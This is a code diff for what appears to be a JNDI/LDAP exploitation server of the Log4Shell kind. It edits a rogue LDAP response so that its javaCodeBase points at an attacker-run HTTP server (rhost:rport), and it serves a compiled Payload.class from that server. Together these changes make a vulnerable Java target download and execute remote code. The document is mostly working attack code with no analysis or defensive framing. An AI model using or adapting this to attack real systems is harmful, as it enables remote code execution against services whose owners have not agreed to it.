@@ -92,7 +92,7 @@ class JNDI(services.Service):
         query_name = query[9:9 + query[8:][0]].decode()
         response = LDAPResponse(query_name, {
             'javaClassName': 'Payload',
-            'javaCodeBase': 'http://{rhost}:{rport}/payload'.format(**self.scenario.context),
+            'javaCodeBase': 'http://{rhost}:{rport}/'.format(**self.scenario.context),  # NOTE: Path must end with '/'
             'objectClass': 'javaNamingReference',
             'javaFactory': 'Payload',
         })
@@ -140,7 +140,7 @@ if __name__ == "__main__":
     httpd = services.simple.http.HTTPStatic(story, address=context['rhost'], port=context['rport'])
     httpd.add_route('/', 'Welcome')
     payload_path = pathlib.Path(pathlib.Path.cwd(), 'Payload.class')
-    httpd.add_route('/payload', open(payload_path, 'rb').read())
+    httpd.add_route('/Payload.class', open(payload_path, 'rb').read())
     httpd.add_event('run', when=events.PathContains('send-requests'))
 
     # story.set_debug()
